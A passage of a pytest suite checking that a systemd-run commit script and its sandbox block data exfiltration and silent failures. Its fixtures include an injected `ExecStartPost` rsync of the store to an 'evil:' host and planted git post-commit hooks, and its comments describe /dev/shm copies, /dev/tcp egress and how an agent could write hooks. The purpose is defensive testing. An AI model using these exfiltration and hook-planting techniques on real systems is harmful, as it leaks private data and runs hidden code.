    (fresh / "alpha" / "svc.md").write_text("real content\n", encoding="utf-8")
    plain = _run(fresh)
    assert plain.returncode == 0 and "1 scope(s) processed" in plain.stdout, (
        f"the unshimmed control did not pass, so the shimmed failure is not "
        f"attributable to the shim:\n{plain.stdout}\n{plain.stderr}")


def test_a_failed_SYMLINK_walk_alarms_on_its_own(tmp_path):
    """The symlinked-scope walk records its own rc, and that capture is
    independently observable rather than riding on the directory walk's.

    Both walks share the store root, so every chmod fixture fails both and a
    single recorded rc would look sufficient — MEASURED as a surviving mutant
    ("drop the symlink walk's rc capture", killed no test) before this existed.
    A symlinked scope is a NAMED FAILURE (see list_scope_symlinks); an
    enumeration of them that silently returns nothing converts that named
    failure straight back into the silence it was written to replace.
    """
    store = tmp_path / "store"
    scope = store / "alpha"
    scope.mkdir(parents=True)
    (scope / "svc.md").write_text("real content\n", encoding="utf-8")

    p = _run(store, PATH=_find_shim_that_fails_the_scope_walk(tmp_path, "l"))

    assert "svc.md" in _git(scope, "ls-files").stdout, (
        f"the readable scope was refused rather than protected:\n"
        f"{p.stdout}\n{p.stderr}")
    assert p.returncode != 0, (
        f"a failed symlink walk was swallowed:\n{p.stdout}\n{p.stderr}")
    assert "symlinks=1" in p.stderr, (
        f"the symlink walk's rc was not the thing that alarmed — a DIFFERENT "
        f"guard fired:\n{p.stderr}")


def test_print_plan_does_not_describe_an_unreadable_store_as_empty(tmp_path):
    """--print-plan is what an operator reaches for to ask "what is in there?",
    so a plan that answers "(none found)" over a store it could not READ is the
    same silent zero, on the more consulted surface."""
    store = tmp_path / "store"
    scope = store / "alpha"
    scope.mkdir(parents=True)
    (scope / "svc.md").write_text("real content\n", encoding="utf-8")

    control = _run(store, "--print-plan")
    assert control.returncode == 0 and "scope:   alpha" in control.stdout, (
        f"the fixture cannot even list a readable scope:\n{control.stdout}")

    try:
        store.chmod(0o300)
        p = _run(store, "--print-plan")
    finally:
        store.chmod(0o700)

    assert "none found" not in p.stdout, (
        f"the plan claimed the store is empty when it could not read it:\n"
        f"{p.stdout}")
    assert p.returncode != 0, f"the plan exited 0 over a partial view:\n{p.stdout}"
    assert "was INCOMPLETE" in p.stderr, (
        f"a DIFFERENT guard fired — this one is still unreached:\n{p.stderr}")


def test_a_scope_name_containing_a_newline_is_one_scope_not_two(tmp_path):
    """🔴 M2. Newline-delimited enumeration split `we\\nird` into two
    nonexistent scopes, each reported "no *.md files — skipping", and the run
    exited 0 — content left UNVERSIONED while the unit claimed success, which is
    precisely the silent loss this script exists to prevent."""
    store = tmp_path / "store"
    scope = store / "we\nird"
    scope.mkdir(parents=True)
    (scope / "alpha.md").write_text("a\n", encoding="utf-8")
    p = _run(store)
    assert p.returncode == 0, p.stderr
    assert "1 scope(s) processed" in p.stdout, (
        f"the scope name was split: {p.stdout}")
    assert (scope / ".git").is_dir(), "the scope was left unversioned"
    assert "alpha.md" in _git(scope, "ls-files").stdout


def test_a_symlinked_scope_fails_loudly_instead_of_silently_vanishing(tmp_path):
    """🔴 THIS TEST USED TO ASSERT THE OPPOSITE, AND THE SUPPORT IT ASSERTED WAS
    NEVER DELIVERED IN PRODUCTION.

    It was `test_a_scope_reached_through_a_symlink_is_still_versioned`, green,
    pinning `-L` on the scope walk. Under the unit's sandbox that does not work,
    and it fails the silent way. MEASURED 2026-08-07, `systemd-run --user` with
    the unit's exact directives, one real scope plus one symlinked scope:

        contained    → "ok — 1 scope(s) processed", exit 0, symlink target has
                       NO .git — never versioned, never mentioned
        uncontained  → "ok — 2 scope(s) processed", target versioned

    ProtectHome=tmpfs masks the target, the link dangles inside the namespace,
    `find -L … -type d` stops matching, and the scope disappears. THIS SUITE RUNS
    UNCONTAINED AND CANNOT SEE ANY OF THAT (RULES.md: a suite whose config pins a
    dimension is structurally blind to that dimension's bugs) — which is exactly
    how a test asserting unsupported behaviour stayed green while the unit lost
    data every night.

    Decision: symlinked scopes are NOT supported. Making them work needs
    BindPaths widened to cover symlink targets — the hole
    test_the_bind_lists_are_pinned_by_exact_contents exists to close — for a
    feature with zero users. So they must FAIL, by name. A symlink must never
    produce a silent `ok`, which is the one property this suite CAN verify and
    which holds in both environments.
    """
    real = tmp_path / "elsewhere" / "real-scope"
    real.mkdir(parents=True)
    (real / "alpha.md").write_text("a\n", encoding="utf-8")
    store = tmp_path / "store"
    store.mkdir()
    (store / "linked-scope").symlink_to(real, target_is_directory=True)
    p = _run(store)
    assert p.returncode != 0, (
        f"a symlinked scope exited 0 — the silent failure is back:\n{p.stdout}")
    assert "is a SYMLINK" in p.stderr, (
        f"a DIFFERENT guard fired — this one is still unreached:\n{p.stderr}")
    assert "linked-scope" in p.stderr, "the failure did not name the scope"
    assert "nothing to do" not in p.stdout, (
        "the run reported nothing to do while a scope sat unversioned")
    assert not (real / ".git").exists(), (
        "the symlinked scope was versioned after all — support was re-added "
        "without widening BindPaths, so it works here and NOT under the unit")


def test_a_store_holding_only_a_symlinked_scope_still_fails(tmp_path):
    """🔴 THE REACHABILITY CASE THE GUARD EXISTS FOR, and the one a naive fix
    misses. With the symlink pass placed after the directory walk, or not
    counted towards `seen`, a store whose ONLY entry is a symlink falls straight
    through to the `seen -eq 0` branch — "no scope directories — nothing to do",
    exit 0. That is the identical silent success, reached by a different route.
    """
    real = tmp_path / "elsewhere" / "real-scope"
    real.mkdir(parents=True)
    (real / "alpha.md").write_text("a\n", encoding="utf-8")
    store = tmp_path / "store"
    store.mkdir()
    (store / "only-link").symlink_to(real, target_is_directory=True)
    p = _run(store)
    assert p.returncode != 0, (
        f"a store holding only a symlinked scope exited 0:\n{p.stdout}")
    assert "is a SYMLINK" in p.stderr, (
        f"a DIFFERENT guard fired — this one is still unreached:\n{p.stderr}")
    assert "nothing to do" not in p.stdout

    # 🔴 ONE FILESYSTEM ENTRY IS ONE SCOPE. The store holds exactly one thing, so
    # the tally must read "1 of 1". Found by a mutation that restored `-L` on the
    # scope walk: the entry was then enumerated BOTH as a symlink and as a
    # directory, giving "1 of 2 scope(s) FAILED" over a one-entry store, plus a
    # contradictory "no repo and no *.md files — skipping" beside the SYMLINK
    # failure. Every other assertion in this file still passed — the mutant was
    # observable only in the count. Same invariant as the newline test: a scope
    # counted twice is a scope the operator cannot reconcile against `ls`.
    assert "1 of 1 scope(s) FAILED" in p.stderr, (
        f"a one-entry store was not tallied as one scope:\n{p.stderr}")
    assert "skipping" not in p.stdout, (
        f"the symlink was ALSO processed as an ordinary scope — the run "
        f"contradicts itself about what it did:\n{p.stdout}")


def test_a_dangling_symlink_at_scope_level_also_fails(tmp_path):
    """🔴 THE PREDICATE MUST BE `-type l`, NOT `-xtype l`.

    Inside the sandbox the symlink is DANGLING (its target is masked by
    ProtectHome=tmpfs); on this host and in this suite it points at a real
    directory. `-xtype l` matches only the first shape, so a guard built on it
    would be green here and untestable — measurable in neither environment at
    the same time. `-type l` matches both, which is what makes the guard
    observable in the suite AND effective under the unit. Both shapes pinned, so
    a later "simplification" to -xtype dies here.
    """
    store = tmp_path / "store"
    store.mkdir()
    (store / "dangling-scope").symlink_to(tmp_path / "does-not-exist")
    p = _run(store)
    assert p.returncode != 0, (
        f"a dangling symlink at scope level exited 0:\n{p.stdout}")
    assert "is a SYMLINK" in p.stderr, (
        f"a DIFFERENT guard fired — this one is still unreached:\n{p.stderr}")


def test_print_plan_shows_a_symlinked_scope_as_a_would_fail(tmp_path):
    """The plan must describe the store the next real run will see. Omitting an
    entry that WILL fail describes a store that does not exist — and --print-plan
    is what an operator reads to understand why the unit is red."""
    real = tmp_path / "elsewhere" / "real-scope"
    real.mkdir(parents=True)
    (real / "alpha.md").write_text("a\n", encoding="utf-8")
    store = tmp_path / "store"
    (store / "ordinary").mkdir(parents=True)
    (store / "ordinary" / "svc.md").write_text("x\n", encoding="utf-8")
    (store / "linked-scope").symlink_to(real, target_is_directory=True)
    p = _run(store, "--print-plan")
    assert p.returncode == 0, p.stderr
    assert "linked-scope" in p.stdout, "the plan hid the symlinked scope"
    assert "SYMLINK" in p.stdout and "would FAIL" in p.stdout, (
        f"the plan did not say the symlinked scope would fail:\n{p.stdout}")
    assert "(none found under" not in p.stdout
    assert not (real / ".git").exists(), "--print-plan mutated the symlink target"


def test_a_symlinked_subdirectory_inside_a_scope_does_not_wedge_the_scope(tmp_path):
    """🔴 A LIVE REGRESSION INTRODUCED BY THE PREVIOUS FIX ROUND, and the reason
    `-L` now appears on exactly one find in commit.sh.

    Fixing symlinked-SCOPE enumeration by putting `-L` on the CANDIDATE walk too
    made it descend into symlinked subdirectories and emit paths beyond them.
    git refuses those pathspecs — `fatal: pathspec 'linkdir/inner.md' is beyond
    a symbolic link` — so `git add` exited 128 and the scope FAILED. MEASURED on
    that tree: byte-identical failure on the next run, i.e. it never self-heals,
    and `git ls-files` stayed EMPTY — the scope's real index files were left
    completely unversioned for as long as the symlink existed.

    What must happen instead: the scope's genuine `*.md` content is committed,
    and the symlink is reported as an uncovered path (which is the documented
    treatment for anything in a scope that is not an index file). Content
    protected first; the surprise still loud.
    """
    store = tmp_path / "store"
    scope = store / "some-scope"
    scope.mkdir(parents=True)
    (scope / "alpha.md").write_text("real content\n", encoding="utf-8")
    outside = tmp_path / "outside" / "deep"
    outside.mkdir(parents=True)
    (outside / "inner.md").write_text("beyond the link\n", encoding="utf-8")
    (scope / "linkdir").symlink_to(outside, target_is_directory=True)

    p = _run(store)
    assert "beyond a symbolic link" not in p.stderr, (
        f"the -L regression is back — git refused a pathspec:\n{p.stderr}")
    assert "alpha.md" in _git(scope, "ls-files").stdout, (
        "the scope's real index file was left unversioned by a symlinked "
        f"subdirectory:\nstdout={p.stdout}\nstderr={p.stderr}")
    assert p.returncode != 0, "the unexpected symlink was not reported at all"
    assert "linkdir" in p.stderr


def test_a_scope_whose_only_markdown_is_beyond_a_symlink_is_not_bootstrapped(tmp_path):
    """🔴 THE PROBE/WALK SEAM. Two finds decide different things about the same
    scope: the `md_probe` decides whether to CREATE a repository, and
    list_candidates decides what can be STAGED. If they disagree about what
    exists, the script bootstraps a repository it can never populate and then
    fails on it every day.

    Found by mutating the probe's `-H` back to `-L` in isolation: nothing in the
    suite moved. With `-L` the probe sees a `.md` beyond a symlinked
    subdirectory and bootstraps; the candidate walk (correctly `-H`) cannot
    stage it, so the run ends "tree is dirty but no candidate paths were
    enumerated" — permanently. Both finds must answer the same question.
    """
    store = tmp_path / "store"
    scope = store / "some-scope"
    scope.mkdir(parents=True)
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "inner.md").write_text("beyond the link\n", encoding="utf-8")
    (scope / "linkdir").symlink_to(outside, target_is_directory=True)

    p = _run(store)
    assert p.returncode == 0, (
        f"a scope with no stageable content failed instead of skipping:\n{p.stderr}")
    assert not (scope / ".git").exists(), (
        "a repository was bootstrapped for a scope whose only *.md is beyond a "
        "symlink and therefore can never be staged — the probe and the "
        "candidate walk disagree")
    assert "skipping" in p.stdout


def test_print_plan_is_honoured_after_the_store_argument(tmp_path):
    """🔴 M5. `--print-plan` was recognised only as $1, so
    `commit.sh <STORE> --print-plan` took the COMMITTING path — MEASURED: it
    initialised a repo and wrote a commit. A dry run that mutates is the worst
    possible failure mode for this script."""
    store = _seed(tmp_path)
    p = subprocess.run([BASH, str(SCRIPT), str(store), "--print-plan"],
                       capture_output=True, text=True)
    assert p.returncode == 0, p.stderr
    assert "remote:  none" in p.stdout, f"not the plan output: {p.stdout}"
    assert not (store / "some-scope" / ".git").exists(), (
        "a --print-plan invocation CREATED A REPO and committed")


def test_an_unknown_option_is_rejected_rather_than_treated_as_the_store(tmp_path):
    """A mistyped flag must not silently become $STORE and send the script off
    to enumerate a directory that does not exist."""
    p = subprocess.run([BASH, str(SCRIPT), "--dry-run", str(_seed(tmp_path))],
                       capture_output=True, text=True)
    assert p.returncode != 0
    assert "unknown option: --dry-run" in p.stderr


def test_two_store_arguments_are_rejected(tmp_path):
    p = subprocess.run([BASH, str(SCRIPT), str(tmp_path / "a"), str(tmp_path / "b")],
                       capture_output=True, text=True)
    assert p.returncode != 0
    assert "at most one STORE argument" in p.stderr


# --------------------------------------------------------------------------- #
# 8. previously-untested guards (M3)
# --------------------------------------------------------------------------- #
def test_a_readme_at_the_store_root_is_exempt_from_the_stray_warning(tmp_path):
    """README.md is the expected signpost at the root. Warning about it every
    single day is how a gate gets trained out of the operator (RULES.md:
    a permanently-red gate is worse than no gate)."""
    store = _seed(tmp_path)
    (store / "README.md").write_text("what this store is\n", encoding="utf-8")
    p = _run(store)
    assert p.returncode == 0, p.stderr
    assert "STORE ROOT" not in p.stderr, (
        f"README.md tripped the stray-file warning:\n{p.stderr}")


def test_a_bootstrapped_scope_is_on_the_configured_branch(tmp_path):
    """`git init` without `-b` lands on git's `init.defaultBranch`, which varies
    by host config — the scope would then be on `master` on one machine and
    `trunk` on another."""
    store = _seed(tmp_path)
    p = _run(store, ASI_BRANCH="indexline")
    assert p.returncode == 0, p.stderr
    head = _git(store / "some-scope", "rev-parse", "--abbrev-ref", "HEAD").stdout.strip()
    assert head == "indexline", f"bootstrapped onto {head!r}, not the configured branch"


def test_commit_signing_is_pinned_off_for_the_scope(tmp_path):
    """A timer must never block on a GPG passphrase prompt. A global
    `commit.gpgsign=true` would otherwise wedge the unit until its timeout."""
    store = _seed(tmp_path)
    p = _run(store)
    assert p.returncode == 0, p.stderr
    val = _git(store / "some-scope", "config", "--local", "commit.gpgsign").stdout.strip()
    assert val == "false", f"commit.gpgsign is {val!r}, not pinned off locally"


def test_a_scope_still_commits_when_signing_is_forced_on_globally(tmp_path):
    """🔴 The behavioural half: pin the setting AND prove it wins.

    Two independent controls now stop a global `commit.gpgsign=true` wedging the
    timer on a GPG prompt — the local `commit.gpgsign false` pin, and the
    wholesale GIT_CONFIG_GLOBAL neutralisation. This asserts the OUTCOME, which
    is what the operator cares about, so it stays honest whichever control is
    doing the work.
    """
    store = _seed(tmp_path)
    home = tmp_path / "home"
    home.mkdir()
    gitconfig = home / "gitconfig"
    gitconfig.write_text(
        "[user]\n\tname = T\n\temail = t@example.com\n"
        "[commit]\n\tgpgsign = true\n"
        "[gpg]\n\tprogram = /nonexistent-gpg\n", encoding="utf-8")
    p = _run(store, HOME=str(home), GIT_CONFIG_GLOBAL=str(gitconfig))
    assert p.returncode == 0, (
        f"a global commit.gpgsign=true wedged the run:\n{p.stderr}")
    assert _commits(store / "some-scope") == 1


def test_an_ambient_git_hook_does_not_fire(tmp_path):
    """🔴 THE EXFILTRATION PATH THAT NEEDED NO EDIT TO commit.sh AT ALL.

    MEASURED on the pre-fix tree (git 2.55.0), end to end: a global
    `[core] hooksPath = <dir>` holding a post-commit hook copied a scope's
    client-identifying content clean out of the store, while commit.sh printed
    "committed <sha>" and "ok — 1 scope(s) processed" and exited 0. The static
    subcommand ledger is structurally incapable of seeing this — the payload was
    in ~/.gitconfig, not in the script.

    `init.templateDir` is the same attack one level earlier: it bakes the hook
    into the repository THIS SCRIPT bootstraps, so it fires even on a scope that
    did not exist when the config was written. Both are asserted here.
    """
    store = _seed(tmp_path)
    home = tmp_path / "home"
    hooks = tmp_path / "evilhooks"
    tmpl = tmp_path / "eviltemplate" / "hooks"
    fired = tmp_path / "FIRED"
    home.mkdir()
    hooks.mkdir()
    tmpl.mkdir(parents=True)
    write_exec(hooks / "post-commit", f'echo hooksPath >> "{fired}"\n')
    write_exec(tmpl / "post-commit", f'echo templateDir >> "{fired}"\n')
    gitconfig = home / "gitconfig"
    gitconfig.write_text(
        "[user]\n\tname = T\n\temail = t@example.com\n"
        f"[core]\n\thooksPath = {hooks}\n"
        f"[init]\n\ttemplateDir = {tmpl.parent}\n", encoding="utf-8")

    p = _run(store, HOME=str(home), GIT_CONFIG_GLOBAL=str(gitconfig))
    assert p.returncode == 0, p.stderr
    assert _commits(store / "some-scope") == 1, "the run did not actually commit"
    assert not fired.exists(), (
        "an ambient git hook FIRED during the run — arbitrary code ran with the "
        f"store readable: {fired.read_text(encoding='utf-8')!r}")
    assert not (store / "some-scope" / ".git" / "hooks" / "post-commit").exists(), (
        "init.templateDir baked a hook into the repo this script bootstrapped")


def test_no_ambient_global_config_reaches_git_at_all(tmp_path):
    """🔴 PINS `GIT_CONFIG_GLOBAL=/dev/null` SPECIFICALLY.

    Found by the sweep: deleting that export killed NOTHING, because the
    `core.hooksPath`/`init.templateDir` env pins independently blocked the hook
    the other test uses. Two controls each sufficient for one attack is good
    defence in depth and bad coverage — neither was individually observable.

    The hook tests cannot distinguish them; an ambient key that is NOT a hook
    can. `[user]` is ideal: if global config were honoured, git would resolve
    that identity and the script would not seed its own. It also states the
    guarantee at full width — the fix is not "dangerous keys are blocked", it is
    "no ambient global config is read", every key.
    """
    store = _seed(tmp_path)
    home = tmp_path / "home"
    home.mkdir()
    gitconfig = home / "gitconfig"
    gitconfig.write_text(
        "[user]\n\tname = Ambient Operator\n\temail = ambient@example.com\n",
        encoding="utf-8")

    p = _run(store, HOME=str(home), GIT_CONFIG_GLOBAL=str(gitconfig))
    assert p.returncode == 0, p.stderr
    who = _git(store / "some-scope", "log", "-1", "--format=%an <%ae>").stdout
    assert "ambient@example.com" not in who, (
        "ambient GLOBAL git config reached git — the neutralisation is gone, so "
        f"every other ambient key (fsmonitor, filter.*.clean, …) is live too: {who!r}")
    assert "analyze-service-index@localhost" in who, who


def test_a_hook_planted_inside_the_scope_does_not_fire(tmp_path):
    """🔴 PINS THE `core.hooksPath` ENV PIN SPECIFICALLY.

    Also found by the sweep: setting GIT_CONFIG_COUNT=0 killed nothing, because
    the ambient-hook test's payload was ALSO blocked by GIT_CONFIG_GLOBAL.
    A repo-LOCAL hook separates them — neutralising ambient config does nothing
    about `.git/hooks/post-commit`, and only the env pin (MEASURED to override
    even a repo-local `core.hooksPath`) stops it.

    This is squarely in the threat model, not a hypothetical: the premise of the
    whole unit is that an agent's Write tool touches this store, and an agent
    that can write `<scope>/foo.md` can write `<scope>/.git/hooks/post-commit`.
    """
    store = _seed(tmp_path)
    assert _run(store).returncode == 0
    scope = store / "some-scope"
    fired = tmp_path / "FIRED"
    hooks = scope / ".git" / "hooks"
    # 🔴 `exist_ok`/`parents` is load-bearing, not defensive: because
    # init.templateDir is pinned at an EMPTY directory, `git init` copies no
    # template content and the repo has no .git/hooks directory at all. An
    # attacker planting a hook would create it, so the fixture must too.
    hooks.mkdir(parents=True, exist_ok=True)
    write_exec(hooks / "post-commit", f'echo local >> "{fired}"\n')
    (scope / "alpha.md").write_text("CHANGED\n", encoding="utf-8")

    p = _run(store)
    assert p.returncode == 0, p.stderr
    assert _commits(scope) == 2, "the run did not actually commit"
    assert not fired.exists(), (
        "a hook planted INSIDE the scope fired — an errant agent Write now has "
        "arbitrary code execution every time the timer runs")


def test_a_bootstrapped_scope_receives_no_template_content(tmp_path):
    """🔴 PINS THE `init.templateDir` ENV PIN SPECIFICALLY.

    The sweep found this control unobservable: replacing it killed no test,
    because `GIT_CONFIG_GLOBAL=/dev/null` independently blocks the only ambient
    source of `init.templateDir`, so the hook-based fixtures could not tell the
    two apart. That is redundancy, which is fine — but an unpinned control is
    one refactor from vanishing unnoticed.

    It IS observable, just not through a hook firing: pinning templateDir at an
    empty directory means `git init` copies NOTHING into the repository this
    script creates. Without the pin, git falls back to its built-in template and
    populates `.git/hooks` with `*.sample` files. Asserting the absence of ALL
    template content states the guarantee at its real width — "this script's
    repositories start empty" — rather than naming one file.
    """
    store = _seed(tmp_path)
    assert _run(store).returncode == 0
    hooks = store / "some-scope" / ".git" / "hooks"
    contents = sorted(p.name for p in hooks.iterdir()) if hooks.is_dir() else []
    assert contents == [], (
        "the bootstrapped scope received template content from git's default "
        f"template dir: {contents}. init.templateDir is no longer pinned, so a "
        "global init.templateDir could bake a hook into every new scope.")


def test_the_local_hook_fixture_would_actually_fire(tmp_path):
    """🔴 POSITIVE CONTROL for the test above — another zero-assertion."""
    scope = tmp_path / "plain-repo"
    scope.mkdir()
    fired = tmp_path / "FIRED"
    subprocess.run(["git", "init", "-q", "-b", "trunk", str(scope)], check=True)
    _git(scope, "config", "user.name", "T")
    _git(scope, "config", "user.email", "t@example.com")
    write_exec(scope / ".git" / "hooks" / "post-commit",
               f'echo local >> "{fired}"\n')
    (scope / "a.md").write_text("x\n", encoding="utf-8")
    _git(scope, "add", "--", "a.md")
    _git(scope, "commit", "-q", "-m", "m")
    assert fired.exists(), (
        "the local-hook fixture does not fire even without commit.sh — "
        "test_a_hook_planted_inside_the_scope_does_not_fire is vacuous")


def test_the_ambient_hook_fixture_would_actually_fire(tmp_path):
    """🔴 POSITIVE CONTROL for the test above. `not fired.exists()` is a ZERO,
    and a zero is indistinguishable from a hook fixture that never worked
    (RULES.md). Drive the same fixture with a plain `git commit` — no commit.sh,
    so none of its neutralisation applies — and watch the hook fire."""
    scope = tmp_path / "plain-repo"
    scope.mkdir()
    hooks = tmp_path / "evilhooks"
    fired = tmp_path / "FIRED"
    hooks.mkdir()
    write_exec(hooks / "post-commit", f'echo hooksPath >> "{fired}"\n')
    home = tmp_path / "home"
    home.mkdir()
    gitconfig = home / "gitconfig"
    gitconfig.write_text(
        "[user]\n\tname = T\n\temail = t@example.com\n"
        f"[core]\n\thooksPath = {hooks}\n", encoding="utf-8")

    env = dict(os.environ)
    env.update({"HOME": str(home), "GIT_CONFIG_GLOBAL": str(gitconfig)})
    for args in (["init", "-q", "-b", "trunk", "."],
                 ["add", "--", "a.md"],
                 ["commit", "-q", "-m", "m"]):
        if args[0] == "add":
            (scope / "a.md").write_text("x\n", encoding="utf-8")
        subprocess.run(["git", "-C", str(scope), *args], env=env,
                       capture_output=True, text=True)

    assert fired.exists(), (
        "the ambient-hook fixture does not fire even WITHOUT commit.sh — "
        "test_an_ambient_git_hook_does_not_fire is therefore vacuous")


def test_the_units_path_provides_every_binary_the_script_uses():
    """A user unit does not inherit the login PATH. Without a binary on it the
    script fails by design — but every day, forever.

    gnugrep and gnused were missing from this list while the script used BOTH
    (`grep -c .` for the change count, `sed 's/^/    /'` for message indent), so
    the pin did not cover what it claimed to.
    """
    src = _home_nix()
    i = src.index("systemd.user.services.analyze-service-index-commit")
    block = src[i:i + 3000]
    m = re.search(r"PATH=\$\{lib\.makeBinPath \[([^\]]*)\]\}", block)
    assert m, "no explicit PATH on the unit"
    for pkg in ("pkgs.git", "pkgs.findutils", "pkgs.coreutils", "pkgs.bash",
                "pkgs.gnugrep", "pkgs.gnused"):
        assert pkg in m.group(1), f"{pkg} missing from the unit PATH"


def _service_block() -> str:
    """The `Service = { … };` body of the unit, brace-matched.

    Fixed-width `src[i:i+N]` slicing (used by the older seam tests) silently
    stops asserting as soon as the block grows past N — a directive added at the
    bottom falls outside the window and no test moves. This reads the real
    extent.
    """
    src = _home_nix()
    i = src.index("systemd.user.services.analyze-service-index-commit")
    j = src.index("Service = {", i) + len("Service = {")
    depth, k = 1, j
    while depth:
        if src[k] == "{":
            depth += 1
        elif src[k] == "}":
            depth -= 1
        k += 1
    return src[j:k - 1]


def _service_directives() -> set:
    """Top-level directive keys inside the Service block."""
    keys, depth = set(), 0
    for line in _service_block().splitlines():
        s = line.strip()
        if depth == 0:
            m = re.match(r'"?([A-Za-z][A-Za-z0-9-]*)"?\s*=', s)
            if m:
                keys.add(m.group(1))
        depth += s.count("[") + s.count("{") - s.count("]") - s.count("}")
    return keys


def _service_list(name: str) -> list:
    """The string literals of a list-valued Service directive, in order.

    Returns None when the directive is absent, so "missing" and "empty" stay
    distinguishable — an empty list read as a missing directive is the
    empty-result confusion this whole PR is about.
    """
    m = re.search(rf"\b{re.escape(name)}\s*=\s*\[(.*?)\]\s*;",
                  _service_block(), re.S)
    if not m:
        return None
    return re.findall(r'"([^"]*)"', m.group(1))


# 🔴 The EXACT set of Service directives. Asserted, not sampled.
SERVICE_DIRECTIVE_LEDGER = {
    "Type", "TimeoutStartSec", "Environment",
    "ProtectSystem", "ProtectHome", "BindReadOnlyPaths", "BindPaths",
    "InaccessiblePaths",
    "PrivateTmp", "PrivateNetwork", "NoNewPrivileges",
    "ExecStart", "X-Restart-Triggers",
}

# 🔴 The EXACT contents of the two bind lists — the directives that ARE the
# containment. See test_the_bind_lists_are_pinned_by_exact_contents.
BIND_PATHS_LEDGER = ["-%h/.claude/analyze-service-index"]
BIND_READ_ONLY_PATHS_LEDGER = ["%h/workspace/devrc/scripts/analyze-service-index"]


def test_execstart_is_the_only_exec_directive():
    """🔴 NOTHING ASSERTED THIS, AND IT IS A ONE-LINE EXFILTRATION.

    `ExecStartPost = "rsync -a %h/.claude/analyze-service-index/ …"` ships the
    entire store off-box every day. systemd runs it as part of the same unit, so
    commit.sh is untouched, the static ledger reads clean, the behavioural
    "writes nothing outside the store" test never executes it, and the unit
    still reports success. Every test in this file stayed green.

    So: the Service block's directive key set is pinned EXACTLY, failing when it
    grows *or* shrinks. Growing catches the injected Exec*; shrinking catches a
    sandbox directive being quietly dropped.
    """
    keys = _service_directives()
    execs = sorted(k for k in keys if k.startswith("Exec"))
    assert execs == ["ExecStart"], (
        f"the unit declares Exec* directive(s) other than ExecStart: {execs}. "
        "ExecStartPre/ExecStartPost/ExecStopPost all run with the store "
        "readable and are not covered by any behavioural test here.")

    added = sorted(keys - SERVICE_DIRECTIVE_LEDGER)
    removed = sorted(SERVICE_DIRECTIVE_LEDGER - keys)
    assert not added, (
        f"the unit gained Service directive(s): {added}. Add them to "
        "SERVICE_DIRECTIVE_LEDGER deliberately, in the same commit, having "
        "thought about what they let the unit reach.")
    assert not removed, (
        f"the unit LOST Service directive(s): {removed}. If a containment "
        "directive was dropped, the no-exfiltration guarantee went with it.")


def test_the_directive_extractor_sees_an_injected_exec():
    """🔴 POSITIVE CONTROL. `execs == ["ExecStart"]` is a near-zero; prove the
    parser can actually see the thing it is asserting the absence of."""
    import types
    fake = types.SimpleNamespace()
    fake.text = (
        "systemd.user.services.analyze-service-index-commit = {\n"
        "    Service = {\n"
        '      Type = "oneshot";\n'
        '      ExecStart = "x";\n'
        '      ExecStartPost = "rsync -a %h/.claude/analyze-service-index/ evil:";\n'
        "      Environment = [\n"
        '        "PATH=/nope"\n'
        "      ];\n"
        "    };\n"
        "  };\n")
    global _home_nix
    original = _home_nix
    try:
        _home_nix = lambda: fake.text  # noqa: E731
        keys = _service_directives()
    finally:
        _home_nix = original
    assert "ExecStartPost" in keys, (
        "the directive extractor cannot see an injected ExecStartPost — "
        "test_execstart_is_the_only_exec_directive is vacuous")
    assert "Environment" in keys, "the extractor missed a list-valued directive"
    assert "PATH" not in keys, "the extractor read a list ELEMENT as a directive"


def test_the_unit_is_contained_so_exfiltration_has_nowhere_to_go():
    """🔴 THE PRIMARY NO-EXFILTRATION CONTROL — the static ledger is secondary.

    Three fix rounds tried to make exfiltration DETECTABLE by reading commit.sh
    and each was evaded a new way (`cp -r`, eight wrapper prefixes, `{`/`\\`).
    These directives make it not land instead.

    VERIFIED LIVE 2026-08-06 on the workbench AND the laptop, with
    `systemd-run --user` carrying exactly these properties and the results read
    from the journal (the nix build sandbox has no systemd, so this test can
    only pin the directives — it cannot execute them):
      * the committer runs normally and its commits persist in the real store;
      * `cp -r <scope> <dir>` → "Read-only file system", rc=1, nothing lands,
        against an uncontained positive control of rc=0 and 27 files copied;
      * bash's BUILTIN `/dev/tcp` egress → rc=1, against rc=0 uncontained. No
        PATH restriction can close that one: it needs no binary at all.

    ⚠ Note what is deliberately NOT claimed: the unit PATH is not a containment
    control. `cp` and `tee` live in pkgs.coreutils, which the script genuinely
    needs, so no honest PATH here removes them.
    """
    block = _service_block()
    for directive, value in (
            ("ProtectSystem", '"strict"'),
            ("ProtectHome", '"tmpfs"'),
            ("PrivateTmp", "true"),
            ("PrivateNetwork", "true"),
            ("NoNewPrivileges", "true")):
        assert re.search(rf"\b{directive}\s*=\s*{re.escape(value)}\s*;", block), (
            f"{directive} = {value} is missing from the unit. Without it the "
            "no-exfiltration guarantee rests entirely on a static check that "
            "has already been evaded three times.")

    # 🔴 /dev/shm. Not covered by ANY of the directives above — MEASURED
    # 2026-08-07 under exactly them: `cp -r <store> /dev/shm/...` rc=0, and the
    # content was still on the HOST after the unit exited, mode 644 under a 1777
    # directory. A mutant doing that survived all 75 tests of the previous round.
    # PrivateDevices and PrivateIPC do NOT close it (both measured: rc=0, still
    # persists); TemporaryFileSystem=/dev/shm makes it private but still
    # writable. InaccessiblePaths is what was measured to work.
    inaccessible = _service_list("InaccessiblePaths")
    assert inaccessible is not None, (
        "InaccessiblePaths is gone. /dev/shm is then writable, world-shared and "
        "HOST-PERSISTENT inside this unit — a working exfiltration target that "
        "ProtectSystem=strict and ProtectHome=tmpfs do not cover.")
    assert "/dev/shm" in inaccessible, (
        f"/dev/shm is not in InaccessiblePaths ({inaccessible}).")


def test_the_bind_lists_are_pinned_by_exact_contents(tmp_path):
    """🔴 THE CONTAINMENT WAS PINNED ON ITS FIRST LIST ELEMENT ONLY.

    The old assertions were prefix regexes anchored at `[`, so APPENDING an
    entry passed. VERIFIED on the previous round's tree:

        BindPaths = [ "-%h/.claude/analyze-service-index" "-%h" ];

    → 75 passed. Live, that second entry gives the unit a writable real $HOME:
    `~/.ssh`, the devrc checkout, everything (MEASURED 2026-08-07 with
    systemd-run --user: write rc=0, content present on the host afterwards).
    One token, no test moves, and the primary no-exfiltration control is gone.

    This is the same class test_execstart_is_the_only_exec_directive closes, and
    it was left open on the two directives that ARE the control. So both lists
    are asserted by EXACT CONTENTS, failing on grow *or* shrink — a directive
    ledger, one level down.

    Deliberately frozen at one entry each. Widening either is what supporting
    symlinked scopes would require, which is why commit.sh refuses them instead.
    """
    for name, ledger in (("BindPaths", BIND_PATHS_LEDGER),
                         ("BindReadOnlyPaths", BIND_READ_ONLY_PATHS_LEDGER)):
